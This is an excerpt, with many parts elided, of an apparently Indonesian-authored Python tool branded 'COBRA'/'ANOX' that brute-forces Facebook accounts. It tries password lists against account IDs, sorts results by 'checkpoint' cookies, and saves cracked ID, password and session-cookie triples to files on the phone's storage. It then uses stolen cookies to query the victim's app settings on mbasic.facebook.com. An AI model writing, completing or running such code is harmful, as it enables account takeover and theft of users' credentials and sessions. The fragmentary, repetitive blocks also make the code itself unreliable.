...
def banner():
	clear()
	print(f"""\x1b[0;34m
   ______    ___   ______   _______          _       
 .' ___  | .'   `.|_   _ \ |_   __ \        / \      
/ .'   \_|/  .-.  \ | |_) |  | |__) |      / _ \     
| |       | |   | | |  __'.  |  __ /      / ___ \    
\ `.___.'\\  `-'  /_| |__) |_| |  \ \_  _/ /   \ \_  
 `.____ .' `.___.'|_______/|____| |___||____| |____| 
...
def crack(idf,pwv):
	...
	fff = '%'
	sys.stdout.write(f"\r \x1b[1;96m[  \x1b[1;96mCOBRA  \x1b[1;96m{loop}\x1b[1;90m＋\x1b[1;96m{len(id)}  \x1b[1;96mOK:{ok}  \x1b[1;96mCP:{cp}  ]"),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{M}└──[ANOX-CP] {m}{idf} | {m}{pw} \n {M} \033[1;90m└──> \033[1;90m{ua} ')
				...
				print(f'\r{h}└──[ANOX-OK] {h}{idf} | {h}{pw} \n {h} └──> {kuki}')
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='ANOX-XD CP'))
					open('/sdcard/ANOX-/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/ANOX--/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='ANOX-OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/ANOX-COOKIE/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='ANOX-XD CP'))
					open('/sdcard/ANOX913/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/ANOX44-/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					...
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/ANOX55-/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
